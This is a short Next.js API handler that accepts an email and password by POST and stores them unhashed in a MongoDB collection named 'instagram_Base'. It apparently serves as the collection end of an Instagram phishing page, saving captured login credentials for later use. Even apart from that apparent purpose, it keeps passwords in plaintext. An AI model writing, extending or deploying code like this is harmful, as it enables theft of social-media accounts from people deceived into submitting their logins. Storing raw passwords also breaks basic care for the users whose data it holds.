import { connectToDb } from "@/db";

export default async (req, res) => {
  if (req.method === "POST") {
    try {
      const { email, password } = req.body;
      const db = await connectToDb();
      const collection = db.collection("instagram_Base");
      await collection.insertOne({ email, password });
      console.log("Data inserted into MongoDB");
      return res.status(200).end();
    } catch (error) {
      console.error("Database error:", error);
      return res.status(500).json({ error: "Database error" });
    }
  } else {
    return res.status(405).end();
  }
};
